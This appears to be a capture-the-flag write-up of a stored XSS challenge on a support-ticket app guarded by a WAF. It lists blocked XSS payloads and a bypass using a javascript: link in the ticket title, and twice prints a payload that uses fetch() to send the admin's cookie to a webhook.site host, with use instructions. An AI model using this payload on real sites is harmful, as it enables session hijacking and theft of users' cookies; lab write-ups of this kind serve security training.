#  Ticketly Challenge — WAF Bypass Writeup
## Challenge Overview

- **Platform:** Ticketly — Support Desk
- **Challenge Type:** Stored XSS with WAF
- **WAF:** BDSEC Firewall™
- **Goal:** Steal the admin's cookie when they review your ticket
- **Flag Format:** `bdsec{...}`
---
## Initial Recon

The application provides a support ticket system where users can:

- Create a support ticket (title + body)
- Report the ticket to an admin
- Wait for an admin bot to review the ticket

The footer displayed:

> Protected by BDSEC Firewall™

This indicated that a Web Application Firewall (WAF) was filtering malicious payloads.

---
# Step 1 — Testing the Ticket Body

The first target was the **ticket body** field.
### Initial Payloads

```html

<script>alert(1)</script>

<img src=x onerror=alert(1)>

<svg onload=alert(1)>

<iframe src="javascript:alert(1)">

```
### Result

Every payload was blocked.

```

Request blocked by BDSEC Firewall™

Signature: SCRIPT_TAG

```

---
## Additional WAF Bypass Attempts
The following techniques were also tested:

- HTML entity encoding
- Base64 encoded SVG
- Unicode escapes
- `Function()` + `String.fromCharCode`
- `<details ontoggle>`
- Throw trick
- JSFuck encoding
- CSS injection
- Meta refresh
- Double URL encoding
### Result
All attempts failed.

The WAF either stripped the payload or rejected the request entirely.

---
# Step 2 — Finding Another Injection Point

The ticket title was reflected directly into the page.


```html

<h2>Ticket #492 — [TITLE_HERE]</h2>

```

A harmless HTML test was performed:

```html

<b>bold</b>

```

The word appeared in **bold**, confirming that HTML rendering was allowed inside the title.

---
# Step 3 — Testing Allowed HTML Tags

Different HTML tags were tested inside the title.

| Payload | Result |

|---------|--------|

| `<b>` | ✅ Allowed |

| `<i>` | ✅ Allowed |

| `<u>` | ✅ Allowed |

| `<img>` | ❌ Blocked |

| `<svg>` | ❌ Blocked |

| `<script>` | ❌ Blocked |

| `<iframe>` | ❌ Blocked |

| `<a href="">` | ✅ Allowed |

### Discovery

The `<a>` (anchor) tag was permitted.

---
# Step 4 — Testing the href Attribute
### Normal URL

```html

<a href="https://example.com">click me</a>

```

Result:

- Clickable link
- Works normally
### javascript: Protocol

```html

<a href="javascript:alert(1)">click me</a>

```

Result:
- JavaScript executed when the link was clicked.
This indicated that the WAF failed to block the `javascript:` protocol inside the `href` attribute.
---
# Step 5 — Final Payload

```html

<a href="javascript:fetch('https://webhook.site/8eed6268-fc98-44a0-8a9f-fc8982eb3354?c='+document.cookie)">click</a>

```
### Execution Flow
1. Create a ticket with the payload in the title.
2. Report the ticket.
3. Admin bot opens the ticket.
4. Admin clicks the link.
5. JavaScript executes.
6. `document.cookie` is appended to the webhook URL.
7. Cookie is sent to the webhook.
---
# Step 6 — Reporting the Ticket
After creating the malicious ticket:

- Click **Report this ticket to the admin**
- The HeadlessChrome (v127) admin bot reviews the ticket.
- The cookie is exfiltrated to the webhook.
---
# Step 7 — Capturing the Flag
The webhook received:
```text

GET /8eed6268-fc98-44a0-8a9f-fc8982eb3354?c=flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}

```
## Flag
```text

bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}

```

---
# Key Takeaways

- Test every input field independently.
- Different fields may use different filtering rules.
- WAFs can have blind spots.
- A single allowed HTML element may be enough to achieve the intended challenge objective.
- Persistence and systematic testing often reveal overlooked attack surfaces.
---
# Tools Used

- Browser Developer Tools
- webhook.site
- Patience and systematic testing
---
# Final Payload

```html

<a href="javascript:fetch('https://webhook.site/YOUR-WEBHOOK-ID?c='+document.cookie)">click</a>

```

Use this payload in the **ticket title**, report the ticket, and wait for the webhook to receive the cookie.

---

_Obito Uchiha — Team AKATSUKI_
